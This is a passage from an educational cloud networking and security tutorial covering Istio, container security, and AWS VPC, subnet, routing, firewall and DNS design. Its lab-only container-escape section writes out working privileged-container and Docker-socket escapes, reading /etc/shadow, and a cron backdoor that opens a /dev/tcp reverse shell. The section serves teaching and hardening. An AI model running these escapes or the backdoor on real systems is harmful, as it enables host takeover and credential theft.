istioctl authn tls-check productpage-v1-xxxx.default

# Enable Kiali dashboard (service mesh observability)
kubectl apply -f istio-*/samples/addons/kiali.yaml
kubectl apply -f istio-*/samples/addons/prometheus.yaml
kubectl apply -f istio-*/samples/addons/grafana.yaml
istioctl dashboard kiali

# Inject fault (chaos engineering):
kubectl apply -f - <<EOF
apiVersion: networking.istio.io/v1alpha3
kind: VirtualService
metadata:
  name: ratings
spec:
  hosts:
  - ratings
  http:
  - fault:
      delay:
        percentage:
          value: 50.0        # 50% of requests get a 7s delay
        fixedDelay: 7s
    route:
    - destination:
        host: ratings
EOF

# Watch how the rest of the app handles the delay
# (circuit breaker should kick in after timeout)
```

---

## 20. Container Security

### Layman's Terms
Containers share the host kernel — unlike VMs which have full isolation. This is like **office workers sharing a building's electricity and plumbing**. If one office catches fire (compromised container), the damage can spread to other offices (other containers or the host) much easier than if everyone were in separate buildings (VMs). Container security is about preventing that spread.

### Container Threat Model

```
Attack surfaces:
  
  1. IMAGE SUPPLY CHAIN:
     Malicious base image → deployed to production
     Unpatched CVEs in base OS packages
     Secrets baked into image layers
     
  2. CONTAINER RUNTIME:
     Container escape via kernel exploits
     Privileged containers → root on host
     Mounted host paths → read/write host filesystem
     
  3. ORCHESTRATOR (Kubernetes):
     Misconfigured RBAC → cluster takeover
     Exposed API server → remote code execution
     etcd access → all secrets in plaintext
     
  4. NETWORK:
     No NetworkPolicy → lateral movement between pods
     Exposed NodePorts → services reachable from internet
     DNS-based service discovery aids attacker reconnaissance
     
  5. SUPPLY CHAIN:
     Compromised CI/CD pipeline → malicious image pushed
     Dependency confusion attacks
     Third-party Helm charts with malicious content
```

### Container Escape Techniques (Lab Only)

```bash
# PRIVILEGED CONTAINER ESCAPE — most common:
# If container is run with --privileged flag:
docker run --privileged -it ubuntu bash

# Inside privileged container:
fdisk -l                          # Can see all host disks!
mkdir /tmp/hostmount
mount /dev/sda1 /tmp/hostmount    # Mount host's root filesystem!
chroot /tmp/hostmount             # Now you're root on the HOST
cat /tmp/hostmount/etc/shadow     # Read host's password file

# Detection:
# Check if running privileged:
cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff = privileged (all caps set)
# CapEff: 00000000a80425fb = normal container (limited caps)

# HOST PATH MOUNT ESCAPE:
docker run -v /:/hostroot -it ubuntu bash
# Inside container:
ls /hostroot/etc/           # Host's /etc is at /hostroot/etc
cat /hostroot/etc/cron.d/   # Can write cron job to host!
echo "* * * * * root bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" \
  > /hostroot/etc/cron.d/backdoor
# Next minute: reverse shell from host

# DOCKER SOCKET ESCAPE:
# If /var/run/docker.sock is mounted in container:
docker run -v /var/run/docker.sock:/var/run/docker.sock -it ubuntu bash

# Inside container:
curl -s --unix-socket /var/run/docker.sock http://localhost/version
# Run a privileged container FROM INSIDE the container:
curl -s --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu","Cmd":["/bin/sh","-c","cat /etc/shadow"],"HostConfig":{"Binds":["/:/hostroot"],"Privileged":true}}'
# This is full host escape — most critical misconfiguration

# NAMESPACE ESCAPE (CVE-2019-5736 — runc exploit):
# Historic: overwrite runc binary from inside container
# Patched but shows kernel/runtime attack surface
```

### Container Hardening

```bash
# 1. NEVER run as root in container
# Dockerfile:
RUN groupadd -r appuser && useradd -r -g appuser appuser
USER appuser

# Kubernetes enforce non-root:
securityContext:
  runAsNonRoot: true
  runAsUser: 1000
  runAsGroup: 1000

# 2. Read-only root filesystem
securityContext:
  readOnlyRootFilesystem: true
# Mount writable volumes only where needed:
volumeMounts:
  - mountPath: /tmp
    name: tmp-volume      # tmpfs for /tmp
volumes:
  - name: tmp-volume
    emptyDir:
      medium: Memory      # tmpfs, not disk

# 3. Drop all Linux capabilities, add only needed ones
securityContext:
  capabilities:
    drop:
    - ALL
    add:
    - NET_BIND_SERVICE    # Only add if binding to port < 1024

# 4. Seccomp profile — restrict syscalls
securityContext:
  seccompProfile:
    type: RuntimeDefault   # Use container runtime's default seccomp

# 5. AppArmor profile
metadata:
  annotations:
    container.apparmor.security.beta.kubernetes.io/mycontainer: runtime/default

# 6. Image scanning in CI/CD
# Trivy (best open-source scanner):
trivy image myapp:latest
trivy image --severity HIGH,CRITICAL myapp:latest
trivy fs --security-checks vuln,config .   # Scan Dockerfile/configs too

# Snyk:
snyk container test myapp:latest

# 7. OPA Gatekeeper — policy enforcement at admission
# Prevent privileged pods from being created:
kubectl apply -f https://raw.githubusercontent.com/open-policy-agent/gatekeeper/release-3.12/deploy/gatekeeper.yaml

cat > constraint.yaml << 'EOF'
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sPSPPrivilegedContainer
metadata:
  name: no-privileged-containers
spec:
  match:
    kinds:
    - apiGroups: [""]
      kinds: ["Pod"]
EOF
kubectl apply -f constraint.yaml

# 8. Falco — runtime container threat detection
# Detects: shell spawned in container, sensitive file access, etc.
helm install falco falcosecurity/falco \
  --set falco.grpc.enabled=true \
  --set falcoctl.artifact.follow.enabled=true

# View Falco alerts:
kubectl logs -l app.kubernetes.io/name=falco -n falco | grep WARNING

# Custom Falco rule:
- rule: Shell Spawned in Container
  desc: A shell was spawned in a container other than Ci/CD
  condition: >
    spawned_process and container and shell_procs and
    not ci_cd_containers
  output: Shell spawned in container (user=%user.name container=%container.name)
  priority: WARNING
```

---

## 21. VPC Architecture — Beyond the Definition

### Layman's Terms
A VPC (Virtual Private Cloud) is your **own private section of a public cloud** — like renting a gated floor in a massive office building. Other tenants (AWS customers) are in the same building, but your floor has its own locks, hallways, and security. You control who can enter and exit, how rooms connect, and what can reach the outside world.

### Real-World Analogy
Building a VPC is like **designing a bank branch's floor plan**:
- The building = AWS Region
- Your floor = VPC
- Rooms = Subnets
- Hallways between rooms = Route tables
- Doors to the street = Internet Gateway
- Security checkpoints = Security Groups + NACLs
- Bank vault (isolated room) = Private subnet with no internet

### Formal Definition
An AWS VPC (Virtual Private Cloud) is a logically isolated section of the AWS Cloud where you can launch AWS resources in a virtual network that you define. You control the IP address range, subnets, route tables, network gateways, and security settings. VPCs span all Availability Zones in a Region but are isolated from other VPCs by default.

### VPC Internals — What AWS Doesn't Publicize

```
CIDR selection (critical choices):
  - VPC CIDR cannot be changed after creation
  - Must not overlap with on-premises networks (for VPN/DirectConnect)
  - Max size: /16 (65,536 IPs)
  - Min size: /28 (16 IPs, minus 5 reserved = 11 usable)
  
  AWS reserves 5 IPs per subnet:
    10.0.1.0   = Network address
    10.0.1.1   = VPC router (implicit router)
    10.0.1.2   = DNS resolver
    10.0.1.3   = Reserved for future use
    10.0.1.255 = Broadcast (not used, just reserved)
  
  So a /24 subnet = 256 - 5 = 251 usable IPs

VPC Router (implicit router at .1):
  Every VPC has a built-in router at x.x.x.1 of each subnet
  This is what "local" route in route table refers to
  Not visible, not configurable — always present
  Handles: inter-subnet routing, gateway routing
  
Multi-VPC considerations:
  CIDR overlap = VPC peering impossible
  Best practice: Use non-overlapping RFC1918 ranges:
    Production:  10.0.0.0/16
    Staging:     10.1.0.0/16
    Development: 10.2.0.0/16
    On-premises: 10.10.0.0/16 (separate range)
  
  Secondary CIDRs: Can add up to 4 secondary CIDRs to a VPC
    Use case: Run out of IPs, add 100.64.0.0/10 CGNAT space
```

### VPC Flow Logs — The Security Engineer's Best Friend

```
VPC Flow Logs capture metadata about all traffic in your VPC.
NOT the packet content — just the who/what/when/how much.

Format (default):
version account-id interface-id srcaddr dstaddr srcport dstport 
protocol packets bytes start end action log-status

Example log entries:
2 123456789 eni-abc123 10.0.1.50 10.0.2.30 54231 443 6 5 3200 START END ACCEPT OK
2 123456789 eni-abc123 1.2.3.4   10.0.1.50 0     22  6 1 60   START END REJECT OK

Storing and querying flow logs:
  Destination: S3, CloudWatch Logs, Kinesis Data Firehose

Query with Athena (SQL on S3 flow logs):
  SELECT srcaddr, dstaddr, dstport, action, COUNT(*) as count
  FROM vpc_flow_logs
  WHERE action = 'REJECT'
    AND start > UNIX_TIMESTAMP(NOW() - INTERVAL 1 HOUR)
  GROUP BY srcaddr, dstaddr, dstport, action
  ORDER BY count DESC
  LIMIT 20;

Security use cases:
  - Detect port scanning: same src → many dst ports in short time
  - Detect data exfiltration: large bytes to unknown external IPs
  - Compliance: prove no unauthorized access occurred
  - Incident response: trace lateral movement path
  - Identify unused Security Group rules (ports REJECT never seen)

Enable flow logs via CLI:
  aws ec2 create-flow-logs \
    --resource-type VPC \
    --resource-ids vpc-12345678 \
    --traffic-type ALL \
    --log-destination-type s3 \
    --log-destination arn:aws:s3:::my-flow-logs-bucket \
    --log-format '${version} ${srcaddr} ${dstaddr} ${srcport} ${dstport} ${protocol} ${action}'
```

---

## 22. Subnets — Public, Private, Isolated

### Layman's Terms
Subnets are the **rooms** inside your VPC building. Some rooms have windows to the outside (public subnets), some only have doors to internal hallways (private subnets), and some are sealed vaults with no outside connection at all (isolated/air-gapped subnets). What makes a subnet "public" or "private" is purely the **route table** — not a flag on the subnet itself.

### Subnet Types Explained

```
PUBLIC SUBNET:
  Definition: Has a route to an Internet Gateway (IGW)
  Instances need: Public IP or Elastic IP to be reachable
  Use for: Load balancers, bastion hosts, NAT Gateways
  
  Route table for public subnet:
    Destination    Target
    10.0.0.0/16    local           ← VPC internal (always present)
    0.0.0.0/0      igw-12345678    ← Default route → IGW → internet
                                      THIS makes it public

PRIVATE SUBNET:
  Definition: No route to IGW, has route to NAT Gateway (for egress)
  Instances: Private IPs only (no public IPs)
  Use for: App servers, databases, backend services
  
  Route table for private subnet:
    Destination    Target
    10.0.0.0/16    local
    0.0.0.0/0      nat-12345678    ← Outbound via NAT GW (no inbound!)

ISOLATED SUBNET (data subnet / air-gapped):
  Definition: No route to IGW or NAT GW — completely internal
  No internet access in OR out
  Use for: RDS databases, ElastiCache, sensitive data stores
  Communicates: Only with other resources in VPC
  
  Route table for isolated subnet:
    Destination    Target
    10.0.0.0/16    local           ← Only VPC-local traffic allowed

ARCHITECTURE BEST PRACTICE (3-tier):

  AZ-a (us-east-1a)    AZ-b (us-east-1b)    AZ-c (us-east-1c)
  ─────────────────    ─────────────────    ─────────────────
  public-a             public-b             public-c
  10.0.0.0/24          10.0.1.0/24          10.0.2.0/24
  [ALB, NAT GW]        [ALB, NAT GW]        [ALB, NAT GW]
  
  private-a            private-b            private-c
  10.0.10.0/24         10.0.11.0/24         10.0.12.0/24
  [EC2, ECS, Lambda]   [EC2, ECS, Lambda]   [EC2, ECS, Lambda]
  
  data-a               data-b               data-c
  10.0.20.0/24         10.0.21.0/24         10.0.22.0/24
  [RDS, ElastiCache]   [RDS, ElastiCache]   [RDS, ElastiCache]
```

### Subnet Design for Kubernetes (EKS)

```
EKS adds complexity: pods need IPs, nodes need IPs.

AWS VPC CNI: pods get VPC IPs from secondary ENIs on nodes.
Problem: A t3.medium node supports max 3 ENIs × 6 IPs = 17 pod IPs

Solution options:
  1. Large node subnets: /19 = 8,192 IPs per subnet
     Allocate from 100.64.0.0/10 (CGNAT) as secondary CIDR
     
  2. EKS with custom networking:
     Assign pod IPs from separate CIDR (not same as node subnet)
     
  3. IPv6 EKS:
     Pods get IPv6 addresses (effectively unlimited)
     No more IP exhaustion for large clusters

EKS subnet tagging (required!):
  Public subnets:
    kubernetes.io/cluster/<cluster-name>: shared
    kubernetes.io/role/elb: 1              ← Required for ALB in public subnets
  
  Private subnets:
    kubernetes.io/cluster/<cluster-name>: shared
    kubernetes.io/role/internal-elb: 1     ← Required for ALB in private subnets
```

---

## 23. Route Tables — Traffic Engineering in Cloud

### Layman's Terms
Route tables are the **GPS navigation rules** for your VPC. Every subnet follows a route table that says "if the destination is X, send traffic to Y." The VPC router reads these tables for every packet leaving a subnet and decides where to forward it.

### Route Table Deep Dive

```
Route table rules processing:
  1. Most specific match wins (longest prefix match)
  2. "local" route is always present and cannot be removed
  3. Only ONE route table per subnet at a time
  4. One route table can be associated with many subnets

Example complex route table (hybrid cloud):
  Destination         Target                    Use Case
  ─────────────────────────────────────────────────────────
  10.0.0.0/16        local                     VPC-internal
  10.10.0.0/16       vgw-12345678              On-premises via VPN
  10.20.0.0/16       tgw-12345678              Other VPCs via Transit GW
  192.168.1.0/24     pcx-12345678              Peered VPC
  pl-68a54001        vpce-12345678             S3 via VPC Endpoint (prefix list)
  0.0.0.0/0          nat-12345678              Internet via NAT GW

Prefix Lists:
  Managed by AWS — dynamically updated list of CIDRs for AWS services
  pl-68a54001 = S3 IPs in us-east-1 (all of them, kept up to date)
  Eliminates manually maintaining 100s of AWS service CIDRs
  
  View AWS managed prefix lists:
  aws ec2 describe-managed-prefix-lists --region us-east-1

Traffic engineering patterns:

PATTERN 1 — Forced internet exit via specific AZ (cost optimization):
  Private subnets in AZ-a/b/c all route 0.0.0.0/0 to NAT GW in AZ-a only
  Saves cost (only one NAT GW) BUT: if AZ-a fails → all lose internet
  Best practice: One NAT GW per AZ for production

PATTERN 2 — Split routing (some traffic on-prem, some internet):
  10.0.0.0/8     → vgw (on-prem corporate)
  172.16.0.0/12  → vgw (on-prem)
  0.0.0.0/0      → igw (internet)
  Corporate DNS, internal tools → on-prem
  External APIs, updates → internet direct

PATTERN 3 — Security appliance (NGF/IDS) as next hop:
  0.0.0.0/0 → eni-firewall (Palo Alto, Checkpoint in VPC)
  All internet-bound traffic inspected by firewall
  Use AWS Gateway Load Balancer for HA of firewall appliances
```

### Hands-On: Route Table Inspection with AWS CLI

```bash
# List all route tables in VPC
aws ec2 describe-route-tables \
  --filters "Name=vpc-id,Values=vpc-12345678" \
  --query 'RouteTables[*].{ID:RouteTableId,Routes:Routes,Assoc:Associations}' \
  --output table

# Find which route table a subnet uses
aws ec2 describe-route-tables \
  --filters "Name=association.subnet-id,Values=subnet-12345678" \
  --query 'RouteTables[0].Routes'

# Simulate packet routing (where would traffic to 8.8.8.8 go?):
# Find subnet's route table → check routes → longest prefix match
# Manually apply LPM logic to determine exit path

# Trace actual path with VPC Reachability Analyzer:
aws ec2 create-network-insights-path \
  --source eni-source123 \
  --destination eni-dest456 \
  --protocol TCP \
  --destination-port 443

aws ec2 start-network-insights-analysis \
  --network-insights-path-id nip-12345678

# This shows EXACTLY what route tables, security groups, NACLs
# the traffic traverses — and where it would be blocked
```

---

## 24. Internet Gateway, NAT Gateway, Egress-Only IGW

### Layman's Terms
- **Internet Gateway (IGW)**: The building's main entrance — two-way door. People can come in and out, but they need an address label on their shirt (public IP) to be let in.
- **NAT Gateway**: A one-way exit ramp. People inside can go out to get things, but nobody from outside can walk in because nobody knows the inside addresses.
- **Egress-Only IGW**: Same as NAT Gateway but for IPv6 — lets IPv6 traffic exit, blocks IPv6 inbound.

### Internet Gateway (IGW)

```
Properties:
  - Horizontally scaled, redundant, highly available (no management needed)
  - Performs 1:1 NAT between private VPC IP and public/Elastic IP
  - One IGW per VPC (but one IGW can serve all public subnets)
  - Free — no per-hour or per-GB charge
  
How IGW NAT works:
  EC2 instance with:
    Private IP: 10.0.0.50
    Elastic IP: 54.200.100.50
  
  Outbound:  10.0.0.50:54321 → IGW → 54.200.100.50:54321 → internet
  Inbound:   internet → 54.200.100.50:54321 → IGW → 10.0.0.50:54321
  
  IGW maintains the NAT table for this 1:1 mapping
  NO NAT for private IPs (10.0.0.50 with NO EIP cannot reach internet)

Security: IGW does NOT filter traffic.
  That's SG + NACL's job.
  IGW itself: passes anything with valid route table entry.
```

### NAT Gateway

```
Properties:
  - Managed by AWS, highly available within AZ
  - Deployed in PUBLIC subnet
  - Uses an Elastic IP address as its source IP
  - Cost: ~$0.045/hr + $0.045/GB data processed (significant at scale!)
  
How NAT Gateway works:
  Private instance (10.0.10.50) wants to reach api.github.com
  
  1. Packet leaves 10.0.10.50, goes to subnet router
  2. Route table: 0.0.0.0/0 → nat-12345678
  3. NAT GW receives packet, translates:
     src: 10.0.10.50:54231 → Elastic IP: 52.200.1.1:10001
  4. NAT GW sends to IGW → internet
  5. Response arrives at NAT GW Elastic IP
  6. NAT GW reverses translation → delivers to 10.0.10.50:54231
  
  Private instance is completely hidden from internet.
  No inbound connections possible (no port forwarding).

Cost optimization:
  NAT Gateway charges per GB — significant for high-bandwidth apps
  
  Optimization 1: VPC Endpoints
    Instead of: EC2 → NAT GW → internet → S3 (pay per GB)
    Use:        EC2 → VPC Endpoint → S3 directly (free!)
    Works for: S3, DynamoDB (gateway endpoints — free)
                All other AWS services (interface endpoints — hourly fee)
  
  Optimization 2: One NAT GW per AZ
    Cross-AZ data is also charged
    EC2 in AZ-b using NAT GW in AZ-a = pay AZ cross-charge + NAT GW
    Solution: Deploy NAT GW in each AZ for production workloads

NAT Gateway vs NAT Instance (legacy):
  NAT Gateway: Managed, scales to 100 Gbps, no bastion host capability
  NAT Instance: EC2 you manage, cheaper for low traffic, can also be bastion
  
  NAT Instance setup (micro use case):
  # EC2 with source/destination check DISABLED (required for NAT):
  aws ec2 modify-instance-attribute \
    --instance-id i-12345678 \
    --no-source-dest-check
  
  # On NAT instance:
  sudo sysctl -w net.ipv4.ip_forward=1
  sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```

### VPC Endpoints — Avoiding Internet for AWS Services

```
Interface Endpoint (AWS PrivateLink):
  Creates ENI in your VPC with private IP
  Traffic to AWS service stays within AWS network (no IGW/NAT)
  Supported services: EC2, SSM, Secrets Manager, KMS, ECR, etc.
  
  aws ec2 create-vpc-endpoint \
    --vpc-id vpc-12345678 \
    --service-name com.amazonaws.us-east-1.ssm \
    --vpc-endpoint-type Interface \
    --subnet-ids subnet-private-a subnet-private-b \
    --security-group-ids sg-endpoint

Gateway Endpoint (S3, DynamoDB only):
  No ENI — route table entry pointing to endpoint
  Free — no hourly or data charge
  
  aws ec2 create-vpc-endpoint \
    --vpc-id vpc-12345678 \
    --service-name com.amazonaws.us-east-1.s3 \
    --vpc-endpoint-type Gateway \
    --route-table-ids rtb-private-a rtb-private-b

Security with endpoints:
  Endpoint Policy: IAM-style policy controlling which S3 buckets accessible:
  {
    "Statement": [{
      "Effect": "Allow",
      "Principal": "*",
      "Action": ["s3:GetObject", "s3:PutObject"],
      "Resource": "arn:aws:s3:::my-company-bucket/*"
    }]
  }
  
  S3 Bucket Policy: Deny access unless via VPC endpoint:
  {
    "Condition": {
      "StringNotEquals": {
        "aws:sourceVpce": "vpce-12345678"
      }
    },
    "Effect": "Deny"
  }
  This ensures S3 data NEVER accessible from internet, only from your VPC.
```

---

## 25. Security Groups — Stateful Firewall Mechanics

### Layman's Terms
Security Groups are like **personal bodyguards assigned to each EC2 instance** (or ENI). The bodyguard keeps a memory of outbound trips — if you (the server) sent a request out, the bodyguard automatically lets the response back in without being asked. No explicit "allow response" rule needed. That's stateful.

### How Security Groups Actually Work

```
Security Groups operate at the ENI (Elastic Network Interface) level.
Each EC2 instance has one or more ENIs.
Up to 5 SGs per ENI, up to 60 rules per SG.

STATEFUL behavior mechanism (connection tracking):
  
  Rule: Allow outbound TCP to 0.0.0.0/0 on port 443
  
  EC2 → 443 → api.github.com  (rule matched, allowed out)
  api.github.com → EC2:54231  (response tracked, automatically allowed in)
  
  Even if there is NO inbound rule for port 54231, it is allowed
  because the SG tracks the outbound connection state.
  
  This uses kernel connection tracking (conntrack) under the hood.

IMPORTANT: SGs are ALLOW-ONLY — there is no explicit deny rule.
  What is not explicitly allowed is implicitly denied.
  You cannot deny a specific IP within a SG (use NACL for that).

SG chaining (security best practice):
  Instead of CIDR-based rules, reference other SGs as source/destination:
  
  ALB-SG:        inbound 443 from 0.0.0.0/0
  App-SG:        inbound 8080 from ALB-SG (only ALB can reach app)
  DB-SG:         inbound 5432 from App-SG (only app can reach DB)
  
  This is MUCH better than CIDRs because:
  - IPs change (auto-scaling, spot replacements)
  - SG references update automatically
  - Intent is clear and auditable

SG rule components:
  Type:          Protocol shorthand (HTTP, HTTPS, SSH, Custom TCP...)
  Protocol:      TCP, UDP, ICMP, All
  Port range:    Single port or range (e.g., 8000-9000)
  Source/Dest:   0.0.0.0/0, specific CIDR, another SG, prefix list
  Description:   FREE TEXT — USE IT for audit/compliance

SG limits (know for architecture decisions):
  5 SGs per ENI
  60 inbound rules + 60 outbound rules per SG
  Each SG rule with SG reference counts as one rule per associated IP
```

### Security Group Hands-On

```bash
# Create a web server SG
aws ec2 create-security-group \
  --group-name web-servers \
  --description "HTTP/HTTPS from internet, SSH from bastion only" \
  --vpc-id vpc-12345678

# Add rules
aws ec2 authorize-security-group-ingress \
  --group-id sg-web123 \
  --ip-permissions \
    IpProtocol=tcp,FromPort=443,ToPort=443,IpRanges=[{CidrIp=0.0.0.0/0,Description="HTTPS from internet"}] \
    IpProtocol=tcp,FromPort=22,ToPort=22,UserIdGroupPairs=[{GroupId=sg-bastion456,Description="SSH from bastion SG"}]

# View all SG rules in VPC (audit)
aws ec2 describe-security-groups \
  --filters "Name=vpc-id,Values=vpc-12345678" \
  --query 'SecurityGroups[*].{Name:GroupName,ID:GroupId,Rules:IpPermissions}'

# Find dangerously open SGs (0.0.0.0/0 on sensitive ports):
aws ec2 describe-security-groups \
  --filters "Name=vpc-id,Values=vpc-12345678" \
  --query 'SecurityGroups[?IpPermissions[?IpRanges[?CidrIp==`0.0.0.0/0`] && (FromPort==`22` || FromPort==`3389` || FromPort==`3306`)]].[GroupId,GroupName]'

# Automated SG audit with Prowler (cloud security tool):
pip install prowler
prowler aws --checks ec2_securitygroup_allow_ingress_from_internet_to_tcp_port_22
```

---

## 26. NACLs — Stateless Layer, Interaction with SGs

### Layman's Terms
NACLs (Network Access Control Lists) are the **building's floor-level security checkpoint** before you even get to the individual bodyguard (Security Group). Unlike the bodyguard (SG) who remembers your face (stateful), the NACL guard checks your ID **every single time** you pass — even on the way out. If you came in through door 80, the guard STILL checks you on the way out through a different door.

### NACL Deep Dive

```
NACL properties:
  - Applied at SUBNET level (affects all instances in subnet)
  - STATELESS: return traffic must be explicitly allowed
  - Rules processed in ORDER (lowest rule number first)
  - First matching rule wins, then STOPS processing
  - Default NACL: allows all inbound and outbound
  - Custom NACL: denies all by default (must add allow rules)
  - Rule numbers: 1–32766, * = default deny (cannot be removed)

Stateless implication — ephemeral ports:
  Client initiates connection to server:443
  Server's response comes FROM port 443 TO client's ephemeral port (1024-65535)
  
  NACL on server's subnet must allow:
    INBOUND:  TCP port 443 from 0.0.0.0/0
    OUTBOUND: TCP ports 1024-65535 to 0.0.0.0/0  ← the ephemeral return traffic
  
  Forgetting the outbound ephemeral port rule = connections appear to work
  (SG is stateful so it allows response) but NACL blocks it → broken!

NACL rule example (explicit):
  Rule# | Type      | Protocol | Port      | Source         | Allow/Deny
  ─────────────────────────────────────────────────────────────────────
  100   | HTTP      | TCP      | 80        | 0.0.0.0/0      | ALLOW
  110   | HTTPS     | TCP      | 443       | 0.0.0.0/0      | ALLOW
  120   | SSH       | TCP      | 22        | 10.0.0.0/8     | ALLOW
  130   | Custom    | TCP      | 1024-65535| 0.0.0.0/0      | ALLOW  ← ephemeral
  200   | ALL       | ALL      | ALL       | 1.2.3.4/32     | DENY   ← block bad IP
  *     | ALL       | ALL      | ALL       | 0.0.0.0/0      | DENY   ← default deny
  
  Rule 200 BEFORE the default deny = explicitly block 1.2.3.4
  This is the ONLY way to block a specific IP (SG cannot deny)

NACL vs SG — when to use which:
  
  Use NACL for:
    - Blocking specific IP addresses (DDoS, blocklists)
    - Subnet-level controls (affects ALL instances in subnet)
    - Defense in depth (additional layer behind SG)
    
  Use SG for:
    - Normal allow rules (allow this service to reach that service)
    - Instance-level controls (per workload)
    - SG references (reference other SGs, not just CIDRs)
    
  Important: BOTH must allow traffic for it to pass.
  NACL blocks → traffic stopped regardless of SG rules.
```

### SG + NACL Interaction — Full Packet Walk

```
Incoming packet: 1.2.3.4:54231 → EC2 (10.0.1.50:443)

1. Packet enters VPC via IGW
2. VPC Router checks route table: 10.0.1.0/24 → local → send to subnet
3. NACL INBOUND rules evaluated (subnet level):
   Rule 100: TCP 443 from 0.0.0.0/0 → ALLOW ✓
4. SG INBOUND rules evaluated (ENI level):
   Rule: TCP 443 from 0.0.0.0/0 → ALLOW ✓
5. Packet delivered to EC2 application

Return packet: EC2 (10.0.1.50:443) → 1.2.3.4:54231

6. SG OUTBOUND: stateful → connection tracked → AUTOMATICALLY ALLOW ✓
7. NACL OUTBOUND rules evaluated (STATELESS — checks every time):
   Rule 130: TCP 1024-65535 to 0.0.0.0/0 → ALLOW ✓
8. Packet leaves subnet → IGW → internet

If step 7 had no rule for ephemeral ports → NACL BLOCKS return traffic
→ Connection hangs → application appears broken → confusing to debug!

Debug tip: If SG looks correct but connections are broken,
           check NACL outbound ephemeral port rules FIRST.
```

---

## 27. DNS in Cloud — Route 53, Private Hosted Zones, Split-Horizon

### Layman's Terms
DNS in cloud is more complex than just "Google's phone book." AWS Route 53 is a DNS service that can make intelligent routing decisions — send users in Tokyo to servers in Tokyo, send 10% of traffic to a new version, or automatically stop sending traffic to a broken server. Plus, your private resources (databases, internal APIs) need DNS names that only exist inside your network — that's private hosted zones.

### Route 53 Deep Dive

```
Route 53 is not just DNS — it's a traffic management platform.

Routing Policies:
  
  1. SIMPLE: One record, one value. Classic DNS.
     api.example.com → 1.2.3.4
  
  2. WEIGHTED: Split traffic by percentage.
     api.example.com → 1.2.3.4 (weight 80)
     api.example.com → 5.6.7.8 (weight 20)
     Use: A/B testing, gradual deployments, blue/green
  
  3. LATENCY: Route to lowest-latency AWS region.
     Route 53 uses real-time AWS latency data
     api.example.com (us-east-1 record) → 1.2.3.4
     api.example.com (ap-southeast-1 record) → 5.6.7.8
     User in Singapore → gets 5.6.7.8 automatically
  
  4. FAILOVER: Active-passive with health checks.
     PRIMARY: api.example.com → 1.2.3.4 (active)
     SECONDARY: api.example.com → 5.6.7.8 (passive, DR site)
     If health check on 1.2.3.4 fails → auto-switch to 5.6.7.8
     
     Health check types:
       - HTTP/HTTPS endpoint check
       - TCP port check
       - String matching (check response body contains "OK")
       - CloudWatch alarm state
  
  5. GEOLOCATION: Route by user's country/continent.
     US users → us-east-1
     EU users → eu-west-1
     Compliance: keep EU data in EU
     Use: GDPR, data sovereignty, localized content
  
  6. GEOPROXIMITY: Like geolocation but with bias dials.
     Bias +50 on us-east-1 = attract traffic from larger area
     Traffic shifting during migrations
  
  7. MULTIVALUE ANSWER: Return up to 8 healthy IPs.
     Client picks randomly (client-side load balancing)
     Poor man's load balancer — no real LB features
  
  8. IP-BASED: Route by client IP CIDR range.
     Corporate office IPs → internal endpoint
     All others → public endpoint
     Use: Direct corporate traffic to Direct Connect endpoint
```

### Private Hosted Zones

```
Private Hosted Zone: DNS names that resolve ONLY inside your VPC.
  db.internal → 10.0.20.50 (RDS private IP)
  api.internal → 10.0.10.30 (internal ALB)
  
  Cannot be queried from internet — resolver returns SERVFAIL

Setup:
  aws route53 create-hosted-zone \
    --name internal.company.com \
    --vpc VPCRegion=us-east-1,VPCId=vpc-12345678 \
    --caller-reference "$(date +%s)" \
    --hosted-zone-config PrivateZone=true

Associate with multiple VPCs:
  aws route53 associate-vpc-with-hosted-zone \
    --hosted-zone-id Z123456 \
    --vpc VPCRegion=us-east-1,VPCId=vpc-99999999

DNS resolver in VPC:
  Every VPC has a DNS resolver at VPC_CIDR_BASE + 2
    (e.g., 10.0.0.2 for 10.0.0.0/16 VPC)
  Also reachable at 169.254.169.253 (link-local, always works)
  This is the Route 53 Resolver

EC2 /etc/resolv.conf:
  nameserver 10.0.0.2   ← VPC resolver
  search us-east-1.compute.internal
```

### Split-Horizon DNS (Dual-View DNS)

```
Same domain name, different answers based on where you ask from.

Use case:
  api.example.com → 10.0.1.50  (internal clients get private IP — no LB, no NAT)
  api.example.com → 52.20.1.1  (external clients get public IP — via ALB/IGW)

Implementation in AWS:
  Public Hosted Zone: api.example.com → 52.20.1.1 (A record, public)
  Private Hosted Zone: api.example.com → 10.0.1.50 (A record, private)
  
  EC2 inside VPC queries → Route 53 Resolver → Private zone wins → gets 10.0.1.50
  External user queries → public DNS → Public zone → gets 52.20.1.1
  
  Internal traffic never leaves VPC (performance + cost benefit).

Route 53 Resolver for Hybrid DNS:
  
  Inbound Endpoint: On-prem DNS can forward to AWS private zones
    On-prem server → 10.0.0.10 (Resolver Inbound Endpoint) → resolves db.internal
    
  Outbound Endpoint: VPC instances can query on-prem DNS
    EC2 wants dc.corp.internal → 10.0.0.20 (Resolver Outbound Endpoint) → on-prem DNS
  
  Forwarding rules:
    corp.internal → forward to 192.168.1.53 (on-prem DNS)
    amazonaws.com → use Route 53 (default)
    everything else → 8.8.8.8

DNS Security in Cloud:
  Route 53 DNSSEC: Sign public hosted zones (protects against cache poisoning)
  Route 53 Resolver DNS Firewall:
    Block queries to known malicious domains (threat intelligence feed)
    Block data exfiltration via DNS tunneling (detect long labels, high volume)
    Alert or block on domain categories (malware, botnets, phishing)
  
  aws route53resolver create-firewall-domain-list \
    --name malicious-domains \
    --creator-request-id req1
  
  aws route53resolver create-firewall-rule \
    --firewall-rule-group-id rslvr-frg-12345 \
    --firewall-domain-list-id rslvr-fdl-12345 \
    --priority 100 \
    --action BLOCK \
    --block-response NXDOMAIN
```

---

## 28. IP Addressing in Cloud

### Layman's Terms
In cloud, IP addresses are not physical — they're virtual and flexible. An IP can float between servers, be assigned to multiple interfaces, or be routed across the world. Understanding what kind of IP you have (public, private, elastic, anycast) determines how your traffic behaves and what you're billed for.

### IP Address Types in AWS

```
1. PRIVATE IP (always assigned):
   Assigned from subnet CIDR on instance launch
   Persists for instance lifetime (even stop/start)
   Changes only on instance termination
   Multiple private IPs per ENI (primary + secondary)
   Use: internal communication, never publicly routable

2. PUBLIC IP (dynamic, optional):
